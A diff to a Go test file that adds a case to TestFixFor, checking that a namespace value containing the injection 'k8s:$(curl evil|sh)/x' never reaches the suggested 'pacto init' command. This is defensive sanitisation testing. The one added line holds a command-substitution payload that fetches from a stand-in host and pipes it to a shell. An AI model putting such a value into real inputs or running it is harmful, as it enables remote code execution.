@@ -166,6 +166,7 @@ func TestAutonomyCountsUntypedOperationsApart(t *testing.T) {
 
 func TestFixFor(t *testing.T) {
 	expect(t, fixFor("missing-contract", "payments", "", nil).Command == "pacto init --cluster --out ./pacto-drafts", "a service name")
+	expect(t, fixFor("missing-contract", "k8s:$(curl evil|sh)/x", "", nil).Command == "pacto init --cluster --out ./pacto-drafts", "a namespace that is no DNS label never reaches the command")
 	expect(t, fixFor("undeclared-range", "checkout", "", nil) == nil, "no provider, no snippet")
 	expect(t, fixFor("incident", "x", "payments", nil) == nil, "nothing to copy for an incident")
 }
